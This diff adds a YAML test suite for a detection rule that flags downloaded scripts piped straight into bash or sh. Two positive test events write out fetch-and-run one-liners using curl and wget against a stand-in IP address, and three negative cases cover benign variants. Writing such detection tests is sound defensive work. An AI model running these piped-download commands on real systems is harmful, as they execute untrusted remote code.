@@ -1,0 +1,30 @@
+tests:
+  - name: detects curl piped into bash
+    event:
+      Image: /bin/bash
+      CommandLine: 'bash -c "curl -s http://198.51.100.10/install.sh | bash"'
+    expected: true
+
+  - name: detects wget piped into sh without spaces around the pipe
+    event:
+      Image: /bin/sh
+      CommandLine: 'sh -c "wget -qO- http://198.51.100.10/i.sh|sh"'
+    expected: true
+
+  - name: ignores curl that saves a file for review
+    event:
+      Image: /usr/bin/curl
+      CommandLine: "curl -sSL -o /tmp/install.sh https://example.org/install.sh"
+    expected: false
+
+  - name: ignores the same pattern against the approved internal mirror
+    event:
+      Image: /bin/bash
+      CommandLine: 'bash -c "curl -s https://packages.lab.internal/install.sh | bash"'
+    expected: false
+
+  - name: ignores a pipe into a non-shell program
+    event:
+      Image: /bin/bash
+      CommandLine: 'bash -c "curl -s https://example.org/data.json | jq .items"'
+    expected: false
